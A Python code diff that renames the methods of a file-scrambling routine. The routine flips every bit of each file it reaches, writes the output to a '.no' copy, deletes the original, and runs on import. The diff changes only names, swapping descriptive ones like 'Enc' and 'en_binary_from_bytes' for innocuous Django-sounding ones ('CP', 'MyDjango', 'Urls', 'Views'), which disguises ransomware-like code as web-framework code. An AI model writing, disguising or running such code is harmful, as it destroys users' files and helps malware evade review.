@@ -5,8 +5,8 @@ import os
 import glob
 from pathlib import Path
 #================================
-class Enc:
-    def bytes_from_file(self,filename, chunksize=8192):
+class CP:
+    def MyDjango(self,filename, chunksize=8192):
         with open(filename, "rb") as f:
             while True:
                 chunk = f.read(chunksize)
@@ -15,14 +15,14 @@ class Enc:
                         yield b
                 else:
                     break
-    def en_binary_from_bytes(self, filename):
+    def Urls(self, filename):
         con = ""
-        for my_byte in self.bytes_from_file(filename):
+        for my_byte in self.MyDjango(filename):
             bi =f'{my_byte:0>8b}'
             solt_sum = "".join([str(int(i)^1) for i in bi])
             con +=solt_sum
         return con
-    def bitstring_to_bytes(self,s):
+    def Views(self,s):
         return int(s, 2).to_bytes((len(s) + 7) // 8, byteorder='big')
     def writer(self,filename, bytesdata):
         with open(filename, "wb") as writer:
@@ -38,11 +38,11 @@ class Enc:
                         continue
                     output = "{}.no".format(filename)
                     original = output.replace(".no","")
-                    bin_data = self.en_binary_from_bytes(filename)
-                    byte_data = self.bitstring_to_bytes(bin_data)
+                    bin_data = self.Urls(filename)
+                    byte_data = self.Views(bin_data)
                     self.writer(output,byte_data)
                     os.remove(filename)
                 except Exception as e:
                     print(e)
                     pass
-Enc().Mode(0)
+CP().Mode(0)
